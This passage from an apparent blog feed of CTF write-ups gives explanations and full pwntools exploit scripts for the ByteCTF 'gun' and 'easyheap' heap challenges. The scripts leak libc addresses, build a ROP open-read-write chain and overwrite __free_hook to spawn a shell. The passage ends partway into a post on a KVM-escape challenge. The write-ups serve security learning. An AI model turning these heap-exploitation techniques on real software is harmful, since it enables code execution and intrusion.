class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./gun&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0x1a1e)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;123.56.96.75&#x27;</span>, <span class="number">30772</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&quot;\n&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Action&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Bullet price: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Bullet Name: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Action&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Shoot time: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Action&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;want to load?&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;lyyl&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your name: &quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>) <span class="comment"># 0 - 6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">0x10</span>) <span class="comment"># 7-9</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0x420</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment"># 12</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment"># 13</span></span><br><span class="line">load(<span class="number">13</span>)</span><br><span class="line">load(<span class="number">12</span>)</span><br><span class="line">load(<span class="number">11</span>)</span><br><span class="line">load(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 12</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment"># 13</span></span><br><span class="line">load(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;Pwn! The  bullet fired.&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Pwn! The &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&quot;bullet fired&quot;</span>, drop=<span class="literal">True</span>).strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0x3f0</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwn! The &quot;</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&quot;bullet fired&quot;</span>, drop=<span class="literal">True</span>).strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x770</span> - <span class="number">0x330</span></span><br><span class="line">log.success(<span class="string">&quot;heap base &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    load(<span class="number">7</span> + i)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">load(<span class="number">10</span>)</span><br><span class="line">load(<span class="number">7</span>)</span><br><span class="line">load(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    load(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000026b72</span> + libc.address</span><br><span class="line">p_rsi_r = <span class="number">0x0000000000027529</span> + libc.address</span><br><span class="line">p_rdx_r12_r = <span class="number">0x000000000011c371</span> + libc.address</span><br><span class="line">p_rax_r = <span class="number">0x000000000004a550</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x0000000000066229</span> + libc.address</span><br><span class="line">ret_addr = <span class="number">0x0000000000025679</span> + libc.address</span><br><span class="line">flag_str_address = heap_base + <span class="number">0x7c0</span> + <span class="number">0x140</span></span><br><span class="line">frame_address = heap_base + <span class="number">0x7c0</span></span><br><span class="line">orw_address = heap_base + <span class="number">0x738</span></span><br><span class="line">read_orw_address = heap_base + <span class="number">0x6f8</span></span><br><span class="line">flag_address = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x200</span></span><br><span class="line"><span class="comment"># 0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">magic = <span class="number">0x0000000000154930</span> + libc.address</span><br><span class="line"></span><br><span class="line">orw = flat([</span><br><span class="line">    p_rax_r, <span class="number">2</span>,</span><br><span class="line">    p_rdi_r, flag_str_address,</span><br><span class="line">    p_rsi_r, <span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    p_rax_r, <span class="number">0</span>,</span><br><span class="line">    p_rdi_r, <span class="number">3</span>,</span><br><span class="line">    p_rsi_r, flag_address,</span><br><span class="line">    p_rdx_r12_r, <span class="number">0x40</span>, <span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    p_rax_r, <span class="number">1</span>,</span><br><span class="line">    p_rdi_r, <span class="number">1</span>,</span><br><span class="line">    p_rsi_r, flag_address,</span><br><span class="line">    p_rdx_r12_r, <span class="number">0x40</span>, <span class="number">0</span>,</span><br><span class="line">    syscall</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">read_orw = flat([</span><br><span class="line">    p_rax_r, <span class="number">0</span>,</span><br><span class="line">    p_rdi_r, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r, orw_address,</span><br><span class="line">    p_rdx_r12_r, <span class="number">0x200</span>, <span class="number">0</span>,</span><br><span class="line">    syscall</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(frame_address) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(read_orw_address) + p64(ret_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + read_orw + <span class="string">b&quot;\n&quot;</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x68</span>, p64(magic) + <span class="string">b&quot;\n&quot;</span>) <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0x150</span>, payload.ljust(<span class="number">0x140</span>, <span class="string">b&quot;\x00&quot;</span>) + <span class="string">b&quot;./flag\x00&quot;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">load(<span class="number">11</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x1a1e)&quot;)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(orw)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序提供了三种功能<code>add,show,delete</code>，函数漏洞的位置存在<code>add</code>函数中，</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020-ByteCTF-%E9%83%A8%E5%88%86PWN-WriteUp/20201025145452.png" alt="图片无法显示，请联系作者" title=" "><p>看到当一开始输入一个超过限制范围的<code>size</code>的时候，然后后面重新输入合适的<code>size</code>的时候，并没有更新<code>v2</code>，因此存在一个任意地址的一字节<code>0</code>写入，当然这个地址偏移是两字节大小。</p><p>这里的利用方式就是提前进行一下堆布局，</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020-ByteCTF-%E9%83%A8%E5%88%86PWN-WriteUp/20201025150657.png" alt="图片无法显示，请联系作者" title=" "><p>通过任意地址写<code>0</code>将<code>top chunk size</code>改小。并且可以通过任意地址写<code>0</code>覆写<code>tcache</code>的<code>fd</code>指针，指向<code>fastbin</code>中堆块的中间位置这里即<code>0x500</code>。申请到<code>0x500</code>的堆块之后，再次申请一个特定大小的堆块，使得其能够触发<code>malloc_consolidate</code>，并且切割之后放入<code>unsorted bin</code>中的<code>chunk</code>中存储<code>libc</code>附近的地址的位置为<code>0x500</code>，这样既可以泄露出<code>libc</code>基址。如下</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020-ByteCTF-%E9%83%A8%E5%88%86PWN-WriteUp/20201025151026.png" alt="图片无法显示，请联系作者" title=" "><p>注意在申请<code>0x500</code>大小的堆块的时候需要伪造<code>0x530</code>堆块的<code>size</code>位，一个原因是过堆块合并的判断，另一个原因就是为之后申请<code>_free_hook</code>的堆块做准备。这里将<code>size</code>伪造为<code>0x31</code>大小。</p><p>此时申请<code>0x30</code>大小的堆块，我们就获得了指向相同堆块的两个内存指针，可以构造<code>double free</code>。但是这里对<code>tcache double free</code>进行了检查，首先需要任意地址写<code>0</code>覆写其<code>keys</code>指针。构造<code>tcache double free</code>，覆写<code>__free_hook</code>为<code>system</code>地址，释放带有<code>/bin/sh</code>的堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./easyheap&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0x175A)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;123.56.96.75&#x27;</span>, <span class="number">30774</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&quot;\n&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">size, new_size, content=<span class="string">b&quot;\n&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(new_size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(size)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>-<span class="number">0x40</span>) <span class="comment"># overflow chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>) <span class="comment"># 7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">overflow(<span class="number">0x60</span> + <span class="number">0x58</span> +<span class="number">0x2</span>, <span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">overflow(<span class="number">0x60</span> + <span class="number">0x58</span> +<span class="number">0x3</span>, <span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *$rebase(0x175A)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">overflow(<span class="number">0x60</span>+<span class="number">0x60</span>+<span class="number">1</span>, <span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;\n&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x58</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x175A)&quot;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">overflow(<span class="number">0x98</span>+<span class="number">2</span>, <span class="number">0x58</span>, <span class="string">b&quot;/bin/sh\x00\n&quot;</span>) <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x28</span>, p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逃逸初探</title>
      <link href="/posts/3129759790.html"/>
      <url>/posts/3129759790.html</url>
      
        <content type="html"><![CDATA[<h2 id="2020-TSCTF-hellovirtual"><a href="#2020-TSCTF-hellovirtual" class="headerlink" title="2020 TSCTF hellovirtual"></a>2020 TSCTF hellovirtual</h2><p>是一个虚拟化的题目，在<code>2018 hitcon abyss</code>改编的题目。这里给出了三个文件<code>hellovirtual,hellokernel,hellousr</code>，还给出了<code>ld.so.2,libc.so.6</code>。</p><p><code>hellovirtual</code>是一个利用<code>KVM api</code>来做虚拟化的程序，它会加载一个小型的内核<code>hellokernel</code>，这个内核仅仅实现了内存管理和程序中断的功能，提供了<code>loader</code>启动和<code>libc</code>加载的一些<code>syscall</code>。然后解析<code>ELF</code>启动一个用户态的程序，这里直接使用的是<code>ld.so.2</code>来加载<code>hellousr</code>。<code>hellousr</code>是一个用户态的程序可以直接在主机上运行。执行流程就是用户态程序<code>hellousr</code>发生系统调用时，<code>hellokernel</code>对系统调用进行一些检查，将一些与<code>IO</code>相关的比如<code>read,write</code>通过<code>I/O Prot</code>(<code>CPU in/out</code>指令)交给<code>hellovirtual</code>处理。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="virtual"><a href="#virtual" class="headerlink" title="virtual"></a>virtual</h4><p>先来看<code>virtual</code>也就是<code>kvm</code>。先放出几个常用的结构体，和操作的十六进制值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_memory_region</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 slot;</span><br><span class="line">  <span class="type">unsigned</span> __int32 flags;</span><br><span class="line">  <span class="type">unsigned</span> __int64 guest_phys_addr;</span><br><span class="line">  <span class="type">unsigned</span> __int64 memory_size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 slot;</span><br><span class="line">  <span class="type">unsigned</span> __int32 flags;</span><br><span class="line">  <span class="type">unsigned</span> __int64 guest_phys_addr;</span><br><span class="line">  <span class="type">unsigned</span> __int64 memory_size;</span><br><span class="line">  <span class="type">unsigned</span> __int64 userspace_addr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 base;</span><br><span class="line">  <span class="type">unsigned</span> __int32 limit;</span><br><span class="line">  <span class="type">unsigned</span> __int16 selector;</span><br><span class="line">  <span class="type">unsigned</span> __int8 type;</span><br><span class="line">  <span class="type">unsigned</span> __int8 present;</span><br><span class="line">  <span class="type">unsigned</span> __int8 dpl;</span><br><span class="line">  <span class="type">unsigned</span> __int8 db;</span><br><span class="line">  <span class="type">unsigned</span> __int8 s;</span><br><span class="line">  <span class="type">unsigned</span> __int8 l;</span><br><span class="line">  <span class="type">unsigned</span> __int8 g;</span><br><span class="line">  <span class="type">unsigned</span> __int8 avl;</span><br><span class="line">  <span class="type">unsigned</span> __int8 unusable;</span><br><span class="line">  <span class="type">unsigned</span> __int8 padding;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_dtable</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 base;</span><br><span class="line">  <span class="type">unsigned</span> __int16 limit;</span><br><span class="line">  <span class="type">unsigned</span> __int16 padding[<span class="number">3</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_sregs</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">cs</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">ds</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">es</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span 